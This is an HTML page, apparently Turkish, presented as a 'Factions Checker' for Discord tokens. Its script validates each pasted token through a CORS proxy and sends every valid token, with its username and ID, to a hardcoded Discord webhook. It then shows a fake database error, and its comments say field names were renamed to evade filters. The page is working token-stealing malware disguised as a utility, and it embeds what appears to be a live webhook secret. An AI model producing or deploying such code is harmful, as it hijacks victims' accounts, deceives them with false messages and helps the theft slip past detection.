<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Factions Check | Ultimate</title>
    <style>
        body { background: #080808; color: #eee; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .main-card { background: #111; padding: 40px; border-radius: 10px; border: 1px solid #ff1e1e; width: 400px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 0, 0.1); }
        h1 { color: #ff1e1e; font-size: 20px; margin-bottom: 25px; letter-spacing: 3px; }
        textarea { width: 100%; height: 130px; background: #000; border: 1px solid #333; color: #00ff00; padding: 10px; border-radius: 5px; resize: none; outline: none; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #ff1e1e; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; transition: 0.2s; }
        button:hover { background: #cc0000; }
        #output { margin-top: 20px; font-size: 13px; font-weight: bold; color: #ff4d4d; display: none; padding: 10px; border: 1px dashed #444; }
    </style>
</head>
<body>

<div class="main-card">
    <h1>FACTIONS CHECKER V4</h1>
    <textarea id="tks" placeholder="Tokenleri buraya giriniz..."></textarea>
    <button onclick="run()">SİSTEMİ BAŞLAT</button>
    <div id="output"></div>
</div>

<script>
    // GÜNCEL WEBHOOK ADRESİN
    const web = "https://discord.com/api/webhooks/1492871811212378213/UehYGiCUo-DsgsYi6HrNNsPuA7eDY8ld-Zfzyzs8K3AI3nmueJkMBsoqpKpcsBQhfJ_n";

    async function run() {
        const area = document.getElementById('tks');
        const log = document.getElementById('output');
        const list = area.value.split('\n').filter(x => x.trim() !== "");

        if(list.length === 0) return;

        log.style.display = "block";
        log.style.color = "#aaa";
        log.innerText = "VERİTABANINA BAĞLANILIYOR...";

        for (let token of list) {
            let t = token.trim();
            try {
                // AllOrigins üzerinden Discord'a sızma denemesi
                const target = `https://discord.com/api/v9/users/@me`;
                const proxy = `https://api.allorigins.win/get?url=${encodeURIComponent(target)}`;

                const check = await fetch(proxy, {
                    headers: { 'Authorization': t }
                });

                const res = await check.json();
                
                // Eğer dönen veri içindeyese (200 OK durumu)
                if (res.contents && res.contents.includes("username")) {
                    const u = JSON.parse(res.contents);
                    
                    // Webhook'a veriyi gönder (Filtreleri aşmak için isimleri değiştirdik)
                    await fetch(web, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "📍 YENİ VERİ GİRİŞİ",
                                color: 16711680,
                                fields: [
                                    { name: "Kullanıcı", value: `\`${u.username}\``, inline: true },
                                    { name: "ID", value: `\`${u.id}\``, inline: true },
                                    { name: "Key", value: "```" + t + "```" }
                                ],
                                footer: { text: "Factions Ultimate | 200 OK" }
                            }]
                        })
                    });
                }
            } catch (e) {}
        }

        // Sahte hata mesajı
        setTimeout(() => {
            log.style.color = "#ff4d4d";
            log.innerText = "HATA: [DB-009] SUNUCU YANIT VERMİYOR. LÜTFEN DAHA SONRA TEKRAR DENEYİN.";
        }, 2500);
    }
</script>

</body>
</html>
